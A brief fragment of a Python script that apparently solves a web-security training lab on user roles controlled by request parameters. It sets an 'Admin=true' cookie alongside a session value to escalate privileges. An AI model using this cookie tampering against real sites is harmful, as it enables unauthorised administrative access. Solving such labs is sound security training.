...
parser = argparse.ArgumentParser(description='Solves the following Lab: User role controlled by request parameter')
...
headers = {"Cookie":f"Admin=true;session={wiener}"}
